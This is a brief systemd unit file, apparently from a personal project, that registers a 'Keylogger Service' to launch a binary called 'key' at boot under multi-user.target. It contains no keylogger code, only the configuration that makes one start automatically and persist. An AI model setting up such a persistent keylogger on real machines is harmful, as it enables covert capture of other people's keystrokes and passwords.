# keylogger.service
[Unit]
Description=Keylogger Service

[Service]
ExecStart=/home/utkarsh/Documents/Project/key

[Install]
WantedBy=multi-user.target

